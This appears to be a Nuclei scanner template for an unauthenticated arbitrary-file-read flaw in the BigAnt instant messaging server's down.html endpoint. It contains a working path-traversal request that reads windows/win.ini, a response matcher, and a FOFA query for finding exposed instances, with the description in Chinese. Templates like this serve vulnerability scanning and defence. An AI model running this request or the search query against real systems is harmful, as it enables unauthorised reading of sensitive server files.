http:
    - matchers:
        - condition: and
          part: body
          type: word
          words:
            - ; for 16-bit app support
        - status:
            - 200
          type: status
      matchers-condition: and
      raw:
        - |
          GET /Api/Update/down.html?file=../../../../../../../../windows/win.ini HTTP/1.1
          Host: {{Hostname}}
id: jiulinkeji-down_html-File-reading
info:
    author: Superhero
    description: |-
        fofa: (body="/Public/static/admin/admin_common.js" && body="/Public/lang/en.js") || body="BigAnt-Admin"
        杭州九麒科技 大蚂蚁即时通讯 down.html 接囗处存在任意文件读取漏洞,未经身份验证的远程攻击者通过漏洞可以获取到服务器敏感信息，导致系统处于极不安全的状态。
    name: 杭州九麒科技 大蚂蚁即时通讯 down.html 任意文件读取漏洞
    reference:
        - https://mp.weixin.qq.com/s/5vSo4s7QCYMqyasYrafC-Q
    severity: high
    tags:
        - File reading
        - bigant
